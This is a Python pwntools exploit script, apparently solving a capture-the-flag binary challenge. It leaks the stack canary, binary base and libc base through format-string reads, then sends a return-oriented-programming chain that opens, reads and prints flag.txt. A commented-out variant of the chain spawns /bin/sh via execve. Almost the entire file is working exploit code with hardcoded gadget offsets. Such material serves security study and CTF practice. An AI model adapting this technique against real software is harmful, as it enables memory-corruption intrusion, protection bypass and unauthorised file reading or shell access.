#!/usr/bin/env python3

from pwn import *

exe = ELF("./task_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tilix','-e','sh','-c']
one = [0x4f2a5,0x4f302,0x10a2fc]
def conn():
    if args.REMOTE:
        r = remote("localhost", 1337)
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r,gdbscript="start")

    return r

def echo(r,msg):
    r.recvuntil(b'message: ')
    r.sendline(msg)
    return r.recvline()


def main():
    r = conn()

    canary =int(echo(r,b'%15$p').strip()[2:],16)
    binary_base = int(echo(r,b'%17$p').strip()[2:],16) - 0xc63
    print(hex(binary_base))
    exe.address = binary_base
    libc_leak = int(echo(r,b'%19$p').strip()[2:],16) - 0x21c87
    # print(hex(libc_leak))
    libc.address = libc_leak
    # print(hex(libc.symbols['open']))
    stack_leak = int(echo(r,b'%16$p').strip()[2:],16) - 0x60 
    mov_eax_2 = libc_leak + 0x0000000000054c77 # mov eax, 2
    push_rax = libc_leak + 0x000000000001b4d0 #push rax
    pop_rax = libc_leak + 0x000000000001b500
    pop_rdi =binary_base+ 0x0000000000000cd3 #pop rdi
    pop_rsi =libc_leak+ 0x0000000000023a6a # pop rsi  
    pop_rdx = libc_leak +0x0000000000130514 #pop rdx, pop r10
    syscall = libc_leak+ 0x0000000000002743 # syscall
    ret = binary_base + 0x00000000000008be #ret 
    push_rax_push_rsp = libc_leak +0x0000000000024ad3
    pop_r15 = binary_base +0x0000000000000cd2 
    mov_rdi_rax =libc_leak+ 0x000000000009af73 # mov rdi, rax; call rcx; 
    pop_rcx=libc_leak+ 0x000000000010c423
    push_rax_pop_rbx = libc_leak+ 0x0000000000052220 #: push rax ; pop rbx ; ret
    # bi = next(libc.search(b'/bin/sh'))
    mov_rdi_rbx = libc_leak+ 0x000000000019a549 #: mov rdi, rbx ; jne 0x19a538 ; pop rbx ; ret
    # print(hex(bi))
    xor  =libc_leak+ 0x00000000000b1485
    paylod = b'flag.txt\x00' *8 + p64(canary)+p64(ret)+\
        p64(pop_rdi) +\
        p64(stack_leak+9) + \
        p64(pop_rsi) + \
        p64(0) + \
        p64(libc.sym['open'])+\
        p64(pop_rsi)+\
        p64(stack_leak+18)+\
        p64(pop_rdx)+\
        p64(47)+\
        p64(0)+\
        p64(ret) +\
        p64(push_rax_pop_rbx)+\
        p64(xor)+\
        p64(mov_rdi_rbx)+\
        p64(0)+\
        p64(libc.sym['read'])+\
        p64(ret) +\
        p64(pop_rdi)+\
        p64(1)+\
        p64(pop_rsi)+\
        p64(stack_leak)+\
        p64(pop_rdx)+\
        p64(100)+\
        p64(0)+\
        p64(libc.sym['write'])


    #paylod = b'A'*72+ p64(canary)+p64(ret) +\
    #p64(pop_rax) +\
    #p64(0x3b) +\
    #p64(pop_rdi) +\
    #p64(bi) +\
    #p64(pop_rsi) +\
    #p64(0) +\
    #p64(pop_rdx)+\
    #p64(0)+\
    #p64(syscall)+\
    #p64(ret)
    # gdb.attach(r,gdbscript=f'b * {binary_base + 0xc39}')
    print(echo(r,paylod))
    r.sendline(b'x')
    r.interactive()


if __name__ == "__main__":
    main()